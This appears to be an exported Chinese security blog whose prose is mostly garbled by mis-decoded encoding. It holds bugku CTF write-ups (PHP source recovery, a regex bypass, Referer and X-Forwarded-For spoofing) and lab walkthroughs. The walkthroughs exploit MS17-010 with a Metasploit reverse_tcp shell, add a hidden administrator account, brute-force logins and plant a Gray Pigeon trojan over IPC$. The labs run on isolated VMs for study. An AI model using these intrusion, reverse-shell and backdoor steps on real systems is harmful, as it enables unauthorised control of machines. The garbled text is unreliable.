<p><img src="/2020/09/10/bugku1/cookie3.png" srcset="/img/loading.gif" alt="hackbar"></p>
<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>æŸ¥çœ‹æºç æç¤ºäº†</p>
<p><code>&lt;!--1p.html--&gt;</code>     </p>
<p>ç›´æ¥è®¿é—®1p.html,å‘ç°ç›´æ¥è·³è½¬åˆ°äº†bugkuçš„ä¸»é¡µï¼Œå…ˆçœ‹æºç ï¼Œå‘ç°ä¸€æ®µç¼–ç åº”è¯¥æ˜¯base64</p>
<p><img src="/2020/09/10/bugku1/never2.png" srcset="/img/loading.gif" alt></p>
<div class="hljs"><pre><code class="hljs gcode">JTIyJT<span class="hljs-symbol">NCaWYlMjglMjElMjRfR0</span>VUJT<span class="hljs-attr">VCJTI3</span>aWQlMjcl<span class="hljs-symbol">NUQlMjklMEElN0</span>IlMEElMDloZWFkZXIlMjglMjdMb<span class="hljs-number">2</span><span class="hljs-symbol">NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4</span>aXQlMjglMjkl<span class="hljs-name">M0</span>IlMEEl<span class="hljs-symbol">N0</span>QlMEElMjRpZCUzRCUy<span class="hljs-symbol">NF9</span>HRVQl<span class="hljs-symbol">NUIlMjdpZCUyNyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGElM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YSUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGIlM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YiUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQWlmJTI<span class="hljs-number">4</span>c<span class="hljs-number">3</span>RyaXB<span class="hljs-attr">vcyUyOCUyNGElMkMlMjcuJTI3</span>JTI<span class="hljs-number">5</span>JTI<span class="hljs-number">5</span>JTBBJTdCJTBBJTA<span class="hljs-number">5</span>ZW<span class="hljs-symbol">NobyUyMCUyN25</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTI<span class="hljs-number">3</span>JT<span class="hljs-symbol">NCJTBBJTA5</span>cmV<span class="hljs-number">0</span>dXJuJTIwJT<span class="hljs-symbol">NCJTBBJTdEJTBBJTI0</span>ZGF<span class="hljs-number">0</span>YSUyMCUzRCUyMEBmaWxlX<span class="hljs-number">2</span>dldF<span class="hljs-number">9</span>jb<span class="hljs-number">250</span>ZW<span class="hljs-number">50</span>cyUyOCUy<span class="hljs-symbol">NGElMkMlMjdyJTI3</span>JTI<span class="hljs-number">5</span>JT<span class="hljs-symbol">NCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3</span>UlMjBpcyUyMGElMjBuaW<span class="hljs-symbol">NlJTIwcGxhdGVmb3</span>JtJTIxJTIyJTIwYW<span class="hljs-number">5</span>kJTIwJTI<span class="hljs-number">0</span>aWQl<span class="hljs-name">M0</span>Ql<span class="hljs-name">M0</span>QwJTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>RybGVuJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyOSUzRTUlMjBhbmQlMjBlcmV<span class="hljs-symbol">naSUyOCUyMjExMSUyMi5</span>zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE<span class="hljs-number">0</span>JTIyJTI<span class="hljs-number">5</span>JTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>Vic<span class="hljs-number">3</span>RyJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyQzAlMkMxJTI<span class="hljs-number">5</span>JTIxJT<span class="hljs-symbol">NENCUyOSUwQSU3</span>QiUwQSUwOXJlcXVpcmUlMjglMjJm<span class="hljs-symbol">NGwyYTNnLnR4</span>dCUyMiUyOSUzQiUwQSU<span class="hljs-number">3</span>RCUwQW<span class="hljs-attr">Vsc2</span>UlMEEl<span class="hljs-symbol">N0</span>IlMEElMDlwcmludCUyMCUyM<span class="hljs-name">m5</span>ldmVyJTIwbmV<span class="hljs-number">2</span>ZXIlMjBuZXZlciUyMGdpdmUlMjB<span class="hljs-number">1</span>cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU<span class="hljs-number">3</span>RCUwQSUwQSUwQSUzRiUzRQ</code></pre></div>

<p>base64è§£ç åä¸ºurlç¼–ç </p>
<div class="hljs"><pre><code class="hljs angelscript">![never1](E:\myblog\szyblog\source\_posts\bugku1\never1.png)%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bif%<span class="hljs-number">28</span>%<span class="hljs-number">21</span>%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>id%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>header%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>Location%<span class="hljs-number">3</span>A%<span class="hljs-number">20</span>hello.php%<span class="hljs-number">3</span>Fid%<span class="hljs-number">3</span>D1%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>exit%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>id%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>id%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>a%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>a%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>b%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>b%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aif%<span class="hljs-number">28</span>stripos%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>a%<span class="hljs-number">2</span>C%<span class="hljs-number">27.</span>%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>echo%<span class="hljs-number">20</span>%<span class="hljs-number">27</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">27</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span><span class="hljs-keyword">return</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>data%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>D%<span class="hljs-symbol">20@</span>file_get_contents%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>a%<span class="hljs-number">2</span>C%<span class="hljs-number">27</span>r%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aif%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>data%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D%<span class="hljs-number">22</span>bugku%<span class="hljs-number">20</span><span class="hljs-keyword">is</span>%<span class="hljs-number">20</span>a%<span class="hljs-number">20</span>nice%<span class="hljs-number">20</span>plateform%<span class="hljs-number">21</span>%<span class="hljs-number">22</span>%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>id%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D0%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>strlen%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">3E5</span>%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>eregi%<span class="hljs-number">28</span>%<span class="hljs-number">22111</span>%<span class="hljs-number">22.</span>substr%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>b%<span class="hljs-number">2</span>C0%<span class="hljs-number">2</span>C1%<span class="hljs-number">29</span>%<span class="hljs-number">2</span>C%<span class="hljs-number">221114</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>substr%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>b%<span class="hljs-number">2</span>C0%<span class="hljs-number">2</span>C1%<span class="hljs-number">29</span>%<span class="hljs-number">21</span>%<span class="hljs-number">3</span>D4%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>require%<span class="hljs-number">28</span>%<span class="hljs-number">22f</span>4l2a3g.txt%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>Aelse%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>print%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>never%<span class="hljs-number">20</span>never%<span class="hljs-number">20</span>never%<span class="hljs-number">20</span>give%<span class="hljs-number">20</span>up%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E</code></pre></div>

<p>urlè§£ç ä¸ºæºç </p>
<p><img src="/2020/09/10/bugku1/never1.png" srcset="/img/loading.gif" alt></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
f(!$_GET[<span class="hljs-string">'id'</span>])
&#123;
	header(<span class="hljs-string">'Location: hello.php?id=1'</span>);
	<span class="hljs-keyword">exit</span>();
&#125;
$id=$_GET[<span class="hljs-string">'id'</span>];
$a=$_GET[<span class="hljs-string">'a'</span>];
$b=$_GET[<span class="hljs-string">'b'</span>];
<span class="hljs-keyword">if</span>(stripos($a,<span class="hljs-string">'.'</span>))
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'no no no no no no no'</span>;
	<span class="hljs-keyword">return</span> ;
&#125;
$data = @file_get_contents($a,<span class="hljs-string">'r'</span>);
<span class="hljs-keyword">if</span>($data==<span class="hljs-string">"bugku is a nice plateform!"</span> <span class="hljs-keyword">and</span> $id==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> strlen($b)&gt;<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> eregi(<span class="hljs-string">"111"</span>.substr($b,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">"1114"</span>) <span class="hljs-keyword">and</span> substr($b,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-number">4</span>)
&#123;
	<span class="hljs-keyword">require</span>(<span class="hljs-string">"f4l2a3g.txt"</span>); <span class="hljs-comment">//æ³¨æ„è¿™é‡Œï¼Œflagåº”è¯¥è—åœ¨è¿™é‡Œ</span>
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">print</span> <span class="hljs-string">"never never never give up !!!"</span>;
&#125;

<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>æœç„¶è—åœ¨f4l2a3g.txt</p>
<p><img src="/2020/09/10/bugku1/never.png" srcset="/img/loading.gif" alt></p>
<h2 id="æ­£åˆ™ï¼Ÿå­—ç¬¦ï¼Ÿ"><a href="#æ­£åˆ™ï¼Ÿå­—ç¬¦ï¼Ÿ" class="headerlink" title="æ­£åˆ™ï¼Ÿå­—ç¬¦ï¼Ÿ"></a>æ­£åˆ™ï¼Ÿå­—ç¬¦ï¼Ÿ</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> 
highlight_file(<span class="hljs-string">'2.php'</span>);
$key=<span class="hljs-string">'KEY&#123;********************************&#125;'</span>;
$IM= preg_match(<span class="hljs-string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="hljs-string">"id"</span>]), $match);
<span class="hljs-keyword">if</span>( $IM )&#123; 
 <span class="hljs-keyword">die</span>(<span class="hljs-string">'key is: '</span>.$key);
&#125;</code></pre></div>



<p><code>preg_match(&quot;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</code></p>
<p>é‡ç‚¹åœ¨è¿™å¥è¯ä¸Šï¼Œè€ƒç‚¹ä¸ºæ­£åˆ™è¡¨è¾¾å¼</p>
<blockquote>
<p><strong>å®šç•Œç¬¦ï¼š</strong>/å’Œ/ï¼ˆä¸€èˆ¬æ¥è¯´æ˜¯è¿™ä¸¤ä¸ªï¼Œå…¶å®é™¤äº†\å’Œå­—æ¯æ•°å­—å…¶å®ƒçš„åªè¦æ˜¯æˆå¯¹å‡ºç°éƒ½å¯ä»¥çœ‹åšå®šç•Œç¬¦ï¼Œæ¯”å¦‚##ã€ï¼ï¼ä¹‹ç±»çš„ï¼‰ï¼›</p>
<p><strong>. ï¼ˆä¸€ä¸ªç‚¹ï¼‰ï¼š</strong>è¡¨ç¤ºå¯ä»¥åŒ¹é…ä»»ä½•å­—ç¬¦ï¼›</p>
<p><strong>*  ï¼š</strong>å‰é¢çš„å­—ç¬¦é‡å¤é›¶æ¬¡æˆ–å¤šæ¬¡ï¼›</p>
<p><strong>{n,m} ï¼š</strong>å‰é¢çš„å­—ç¬¦é‡å¤4~7æ¬¡ï¼›</p>
<p><strong>\ ï¼ˆåæ–œçº¿ï¼‰ï¼š</strong>åé¢çš„å­—ç¬¦è¢«è½¬ä¹‰ï¼›</p>
<p><strong>[a-z] ï¼š</strong>åœ¨aåˆ°zä¸­åŒ¹é… ï¼›</p>
<p><strong>[[:punct:]] ï¼š</strong>åŒ¹é…ä»»ä½•æ ‡ç‚¹ç¬¦å·ï¼›</p>
<p><strong>/i ï¼š</strong>è¡¨ç¤ºè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼›</p>
</blockquote>
<p>å› æ­¤å¯ä»¥å†™å‡ºç¬¦åˆè¦æ±‚çš„å­—ç¬¦ç©¿</p>
<p><code>keyakey22222key:/a/aaakeyb!</code></p>
<p><img src="/2020/09/10/bugku1/%E6%AD%A3%E5%88%99.png" srcset="/img/loading.gif" alt></p>
<h2 id="ä½ ä»å“ªé‡Œæ¥"><a href="#ä½ ä»å“ªé‡Œæ¥" class="headerlink" title="ä½ ä»å“ªé‡Œæ¥"></a>ä½ ä»å“ªé‡Œæ¥</h2><p>é¢˜ç›®æç¤º are you from google?</p>
<p>ä½ æ˜¯ä»googleæ¥çš„å—</p>
<p>è€ƒå¯Ÿhttpå¤´ä¸­çš„refererå‚æ•°</p>
<p><strong>Refererï¼šæµè§ˆå™¨å‘ WEB æœåŠ¡å™¨è¡¨æ˜è‡ªå·±æ˜¯ä»å“ªä¸ª ç½‘é¡µ/URL è·å¾—/ç‚¹å‡» å½“å‰è¯·æ±‚ä¸­çš„ç½‘å€/URLã€‚<br>ä¾‹å¦‚ï¼šRefererï¼š<a href="http://www.sina.com/" target="_blank" rel="noopener">http://www.sina.com/</a></strong> </p>
<p>é‚£ä¹ˆå°±æŠ“åŒ…ä¿®æ”¹refererè¿™ä¸ªå‚æ•°</p>
<p><code>Referer: https://www.google.com/</code>,ç›´æ¥goå³å¯</p>
<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>è¿™é¢˜æ˜¯NCTFçš„ä¸€é“é¢˜ï¼ŒåŸé¢˜æ˜¯ç»™äº†æºç </p>
<h2 id="æœ¬åœ°è®¿é—®"><a href="#æœ¬åœ°è®¿é—®" class="headerlink" title="æœ¬åœ°è®¿é—®"></a>æœ¬åœ°è®¿é—®</h2><p>è§åˆ°é¢˜ç›®å°±æƒ³åˆ°äº†<code>x-forwarded-for</code>ï¼Œæœ¬åœ°åœ°å€å¯ä»¥ä½¿ç”¨IP:127.0.0.1</p>
<p>å¯ä»¥ä½¿ç”¨googleæµè§ˆå™¨çš„æ’ä»¶<img src="/2020/09/10/bugku1/xff.png" srcset="/img/loading.gif" alt></p>
<p><img src="/2020/09/10/bugku1/localhost.png" srcset="/img/loading.gif" alt></p>
<p>ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨bpæŠ“åŒ…ä¿®æ”¹<code>x-forwarded-for</code></p>
<p><img src="/2020/09/10/bugku1/lc.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>è„šæœ¬</tag>
        <tag>php</tag>
        <tag>cookie</tag>
        <tag>ç¼–ç </tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘å®‰ä½œä¸š</title>
    <url>/2020/09/27/homework/</url>
    <content><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><a id="more"></a>

<h2 id="1-å‡†å¤‡å·¥ä½œ"><a href="#1-å‡†å¤‡å·¥ä½œ" class="headerlink" title="1.å‡†å¤‡å·¥ä½œ"></a>1.å‡†å¤‡å·¥ä½œ</h2><p>å¼€å¯ä¸¤å°è™šæ‹Ÿæœºï¼Œä¸€å°kaliä½œä¸ºæ”»å‡»æ–¹ï¼Œä¸€å°win7ä½œä¸ºè¢«æ”»å‡»æ–¹</p>
<p>å°†ä¸¤å°è™šæ‹Ÿæœºæ¡¥æ¥åˆ°åŒä¸€ç½‘å¡ï¼Œå¹¶ä¿è¯èƒ½å¤Ÿé€šä¿¡</p>
<p>Kali IP 10.1.1.1  255.0.0.0  win7 IPã€€10.1.1.2  255.0.0.0</p>
<p>æµ‹è¯•ä¸¤å°ä¸»æœºä¹‹é—´çš„é€šä¿¡æƒ…å†µ</p>
<p><img src="/2020/09/27/homework/1.png" srcset="/img/loading.gif" alt></p>
<p><img src="/2020/09/27/homework/2.png" srcset="/img/loading.gif" alt> </p>
<p>ä½¿ç”¨msfå‰éœ€è¦å¼€å¯postgresqlæœåŠ¡ </p>
<p>å¼€å¯æœåŠ¡ï¼šservice postgresql start </p>
<p>æŸ¥çœ‹æœåŠ¡çŠ¶æ€ï¼šservice postgresql status</p>
<p>å¼€åˆ°ç»¿è‰²å­—ä½“çš„activeå³ä¸ºå¼€å¯äº†</p>
<p>åˆå§‹åŒ–æ•°æ®åº“ï¼šmsfdb init </p>
<p><img src="/2020/09/27/homework/3.png" srcset="/img/loading.gif" alt> </p>
<h2 id="2-æ”»å‡»è¿‡ç¨‹"><a href="#2-æ”»å‡»è¿‡ç¨‹" class="headerlink" title="2. æ”»å‡»è¿‡ç¨‹"></a>2. æ”»å‡»è¿‡ç¨‹</h2><h3 id="1-é¦–å…ˆåˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦æ‰“å¼€445ç«¯å£"><a href="#1-é¦–å…ˆåˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦æ‰“å¼€445ç«¯å£" class="headerlink" title="(1).é¦–å…ˆåˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦æ‰“å¼€445ç«¯å£"></a>(1).é¦–å…ˆåˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦æ‰“å¼€445ç«¯å£</h3><p>ä½¿ç”¨nmap+ip æ‰«æ</p>
<p><img src="/2020/09/27/homework/4.png" srcset="/img/loading.gif" alt> </p>
<h3 id="2-ç¡®è®¤ç›®æ ‡ä¸»æœºæ‰“å¼€445ç«¯å£åç›´æ¥ä½¿ç”¨msfè¿›è¡Œæ”»å‡»"><a href="#2-ç¡®è®¤ç›®æ ‡ä¸»æœºæ‰“å¼€445ç«¯å£åç›´æ¥ä½¿ç”¨msfè¿›è¡Œæ”»å‡»" class="headerlink" title="(2) .ç¡®è®¤ç›®æ ‡ä¸»æœºæ‰“å¼€445ç«¯å£åç›´æ¥ä½¿ç”¨msfè¿›è¡Œæ”»å‡»"></a>(2) .ç¡®è®¤ç›®æ ‡ä¸»æœºæ‰“å¼€445ç«¯å£åç›´æ¥ä½¿ç”¨msfè¿›è¡Œæ”»å‡»</h3><p>è¾“å…¥msfconsoleã€€å¯åŠ¨ï½ï½“ï½†</p>
<p>è¾“å…¥searchã€€MS17-010</p>
<p>æ‰¾åˆ°exploit windows/smb/ms17_010_eternalblue,</p>
<p>è¿è¡Œ</p>
<div class="hljs"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> exploitwindows/smb/ms17_010_eternalblue</code></pre></div>

<p>è¾“å…¥ show options  æŸ¥çœ‹éœ€è¦é…ç½®å“ªäº›ä¿¡æ¯</p>
<p>RHOSTS ä¸ºç›®æ ‡ä¸»æœºIP(10.1.1.2)</p>
<p>RPORT ä¸ºç›®æ ‡ç«¯å£å·(445)</p>
<p>LHOST ä¸ºç›‘å¬ä¸»æœºIP(10.1.1.1)</p>
<p><img src="/2020/09/27/homework/5.png" srcset="/img/loading.gif" alt> </p>
<p><img src="/2020/09/27/homework/6.png" srcset="/img/loading.gif" alt> </p>
<h3 id="3-é…ç½®æˆåŠŸåè®¾ç½®tcpè¿æ¥"><a href="#3-é…ç½®æˆåŠŸåè®¾ç½®tcpè¿æ¥" class="headerlink" title="(3). é…ç½®æˆåŠŸåè®¾ç½®tcpè¿æ¥"></a>(3). é…ç½®æˆåŠŸåè®¾ç½®tcpè¿æ¥</h3><p>è¾“å…¥å‘½ä»¤</p>
<div class="hljs"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/x64/<span class="hljs-comment">meterpreter</span>/reverse_tcp</code></pre></div>



<h3 id="4-å¼€å§‹è¿è¡Œ"><a href="#4-å¼€å§‹è¿è¡Œ" class="headerlink" title="(4).å¼€å§‹è¿è¡Œ"></a>(4).å¼€å§‹è¿è¡Œ</h3><p>è¾“å…¥ exploit/run </p>
<p>æˆåŠŸè·å–shell</p>
<p> <img src="/2020/09/27/homework/8.png" srcset="/img/loading.gif" alt></p>
<p><img src="file:///C:%5CUsers%5CSunzh%5CAppData%5CLocal%5CTemp%5Cksohtml14056%5Cwps9.jpg" srcset="/img/loading.gif" alt="img"> </p>
<p>æŸ¥çœ‹ipåœ°å€éªŒè¯æ˜¯å¦ä¸ºç›®æ ‡ä¸»æœºã€‚</p>
<h3 id="5-è®¾ç«‹åé—¨ï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·"><a href="#5-è®¾ç«‹åé—¨ï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·" class="headerlink" title="(5)è®¾ç«‹åé—¨ï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·"></a>(5)è®¾ç«‹åé—¨ï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·</h3><p>åˆ›å»ºä¸€ä¸ªç”¨æˆ·</p>
<div class="hljs"><pre><code class="hljs routeros">net<span class="hljs-built_in"> user </span>test abc123.com /add</code></pre></div>

<p>Username:test </p>
<p>password:abc123.com</p>
<p><img src="/2020/09/27/homework/9.png" srcset="/img/loading.gif" alt> </p>
<p>å°†è¯¥ç”¨æˆ·åŠ å…¥ç®¡ç†å‘˜ç»„ï¼Œä½¿å…¶æ‹¥æœ‰ç®¡ç†å‘˜æƒé™</p>
<div class="hljs"><pre><code class="hljs dockerfile">net localgroup administrtors test /<span class="hljs-keyword">add</span></code></pre></div>

<p><img src="/2020/09/27/homework/10.png" srcset="/img/loading.gif" alt> </p>
<p>ç›®æ ‡ä¸»æœºä¸Šç”¨æˆ·åˆ›å»ºæˆåŠŸ</p>
<img src="/2020/09/27/homework/11.png" srcset="/img/loading.gif" style="zoom:70%;">





<p> <strong>å®éªŒç»“æŸ</strong></p>
]]></content>
      <categories>
        <category>ç½‘å®‰ä½œä¸š</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>æœ¨é©¬</title>
    <url>/2020/07/18/%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="åˆè¯†æœ¨é©¬"><a href="#åˆè¯†æœ¨é©¬" class="headerlink" title="åˆè¯†æœ¨é©¬"></a>åˆè¯†æœ¨é©¬</h1><a id="more"></a>
<h2 id="å®éªŒç›®çš„"><a href="#å®éªŒç›®çš„" class="headerlink" title="å®éªŒç›®çš„"></a>å®éªŒç›®çš„</h2><p><strong>ä½¿ç”¨ç°é¸½å­è½¯ä»¶ä»¥åŠç«¯å£çˆ†ç ´è½¯ä»¶æ§åˆ¶ç›®çš„ä¸»æœº</strong></p>
<p>å‡†å¤‡ä¸€å°xpï¼Œä¸€å°2003<br>å…¶ä¸­xpåœ°å€ä¸º10.1.1.3/24 2003ä¸º10.1.1.1/24<br>ä½¿ä¸¤ä¸ªä¸»æœºèƒ½å¤Ÿé€šä¿¡<br>xpä½œä¸ºæ”»å‡»æ–¹ï¼Œ2003ä¸ºå—å®³è€…</p>
<h3 id="1-åˆ¶ä½œæœ¨é©¬"><a href="#1-åˆ¶ä½œæœ¨é©¬" class="headerlink" title="1.åˆ¶ä½œæœ¨é©¬"></a>1.åˆ¶ä½œæœ¨é©¬</h3><p>ä½¿ç”¨ç°é¸½å­åˆ¶ä½œæœ¨é©¬ï¼Œå°†æœ¨é©¬ç”Ÿæˆåœ¨åœ¨æ¡Œé¢ï¼ˆè®°ä½è·¯å¾„ä¹‹åè¦ä½¿ç”¨ï¼‰<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/3.png" srcset="/img/loading.gif" alt><br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/4.png" srcset="/img/loading.gif" alt></p>
<h3 id="2-æ‰«æä¸»æœºï¼Œå¹¶å¯¹è´¦å·å¯†ç è¿›è¡Œçˆ†ç ´"><a href="#2-æ‰«æä¸»æœºï¼Œå¹¶å¯¹è´¦å·å¯†ç è¿›è¡Œçˆ†ç ´" class="headerlink" title="2.æ‰«æä¸»æœºï¼Œå¹¶å¯¹è´¦å·å¯†ç è¿›è¡Œçˆ†ç ´"></a>2.æ‰«æä¸»æœºï¼Œå¹¶å¯¹è´¦å·å¯†ç è¿›è¡Œçˆ†ç ´</h3><p>ipèµ·å§‹åœ°å€ä¸º10.1.1.1-10.1.1.255<br>å¯†ç é…ç½®æ–‡ä»¶<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/2.png" srcset="/img/loading.gif" alt><br>å…¶å®åªè¦æ‰«æ10.1.1.1å³å¯ï¼ˆå› ä¸ºæ˜¯å®éªŒï¼‰</p>
<p>è·å–è´¦å·å¯†ç <br>usernameï¼šadministrator<br>password: â€œâ€</p>
<h3 id="3-ä¸ç›®æ ‡ä¸»æœºå»ºç«‹IPC"><a href="#3-ä¸ç›®æ ‡ä¸»æœºå»ºç«‹IPC" class="headerlink" title="3.ä¸ç›®æ ‡ä¸»æœºå»ºç«‹IPC$"></a>3.ä¸ç›®æ ‡ä¸»æœºå»ºç«‹IPC$</h3><p><code>net use \\10.1.1.1\ipc$ &quot;&quot; \user:administrator</code></p>
<h3 id="4-æ¤å…¥æœ¨é©¬åˆ°ç›®æ ‡ä¸»æœº"><a href="#4-æ¤å…¥æœ¨é©¬åˆ°ç›®æ ‡ä¸»æœº" class="headerlink" title="4.æ¤å…¥æœ¨é©¬åˆ°ç›®æ ‡ä¸»æœº"></a>4.æ¤å…¥æœ¨é©¬åˆ°ç›®æ ‡ä¸»æœº</h3><p><code>copy C:\Documents and Settings\shimisi\æ¡Œé¢\qq.exe  \\10.1.1.1\ipc$</code></p>
